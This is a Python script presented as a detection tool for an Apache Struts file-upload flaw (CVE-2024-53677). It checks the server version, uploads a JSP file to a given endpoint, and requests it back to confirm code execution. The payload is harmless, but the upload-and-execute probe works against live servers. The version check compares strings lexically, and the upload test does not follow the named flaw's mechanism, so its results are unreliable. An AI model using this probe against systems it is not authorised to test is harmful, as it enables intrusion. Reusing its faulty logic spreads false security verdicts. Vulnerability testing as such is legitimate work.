import requests
import argparse
import re
import logging
from urllib.parse import urljoin

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()]
)

def check_version(target_url):
    """
    Checks the Apache Struts version to determine if it is vulnerable.
    """
    try:
        logging.info(f"Checking Apache Struts version for {target_url}")
        response = requests.get(target_url, timeout=10)
        
        if response.status_code == 200:
            # Extract Apache Struts version from headers or HTML
            version = None
            if "Server" in response.headers:
                version_match = re.search(r"Struts/([\d.]+)", response.headers.get("Server", ""))
                if version_match:
                    version = version_match.group(1)

            if not version:
                version_match = re.search(r"Apache Struts ([\d.]+)", response.text)
                if version_match:
                    version = version_match.group(1)

            if version:
                logging.info(f"Detected Apache Struts version: {version}")
                if is_vulnerable_version(version):
                    logging.warning(f"Vulnerable version detected: {version}")
                    return True
                else:
                    logging.info(f"Secure version detected: {version}")
                    return False
            else:
                logging.info("Apache Struts version could not be determined.")
                return False
        else:
            logging.error(f"Failed to retrieve version. HTTP Status Code: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        logging.error(f"Error checking version: {e}")
        return False

def is_vulnerable_version(version):
    """
    Determines if the detected version is vulnerable.
    """
    vulnerable_ranges = [
        ('2.0.0', '2.5.33'),
        ('6.0.0', '6.3.0.2')
    ]
    for start, end in vulnerable_ranges:
        if start <= version <= end:
            return True
    return False

def test_file_upload(target_url, upload_endpoint):
    """
    Tests for file upload vulnerability by attempting to upload a malicious file.
    """
    upload_url = urljoin(target_url, upload_endpoint)
    malicious_file_name = "test_exploit.jsp"
    malicious_payload = """<% out.println("Exploit test successful!"); %>"""
    files = {
        'file': (malicious_file_name, malicious_payload, 'application/octet-stream')
    }

    logging.info(f"Testing file upload at {upload_url}")
    try:
        response = requests.post(upload_url, files=files, timeout=10)
        
        if response.status_code == 200:
            logging.info("File upload request completed. Verifying payload execution...")
            return verify_payload(target_url, malicious_file_name)
        elif response.status_code in [401, 403]:
            logging.warning(f"Access Denied (HTTP {response.status_code}). Ensure proper permissions.")
            return False
        else:
            logging.info(f"File upload failed. HTTP Status Code: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        logging.error(f"Error during file upload test: {e}")
        return False

def verify_payload(target_url, file_name):
    """
    Verifies if the uploaded payload can be executed.
    """
    payload_url = urljoin(target_url, file_name)
    logging.info(f"Verifying payload at {payload_url}")

    try:
        response = requests.get(payload_url, timeout=10)
        
        if response.status_code == 200 and "Exploit test successful!" in response.text:
            logging.critical(f"Exploit successful! Payload executed at {payload_url}")
            return True
        elif response.status_code == 404:
            logging.info("Payload not found. Server may be secure.")
            return False
        else:
            logging.info(f"Unexpected HTTP response during verification: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        logging.error(f"Error during payload verification: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="CVE-2024-53677 Detection Script")
    parser.add_argument("target_url", help="Target base URL (e.g., http://example.com)")
    parser.add_argument("upload_endpoint", help="Path to file upload endpoint (e.g., /upload)")
    parser.add_argument("--check_version", action="store_true", help="Check Apache Struts version")
    args = parser.parse_args()

    logging.info("Starting CVE-2024-53677 detection process...")
    
    if args.check_version:
        logging.info("Checking Apache Struts version...")
        if check_version(args.target_url):
            logging.warning("The detected version is vulnerable.")
        else:
            logging.info("No vulnerabilities detected in version check.")

    # Test file upload
    if test_file_upload(args.target_url, args.upload_endpoint):
        logging.critical("Vulnerability confirmed: File upload endpoint is exploitable!")
    else:
        logging.info("File upload test completed. No vulnerabilities detected.")

    logging.info("Detection process completed.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.info("Execution interrupted by user.")
        exit(0)
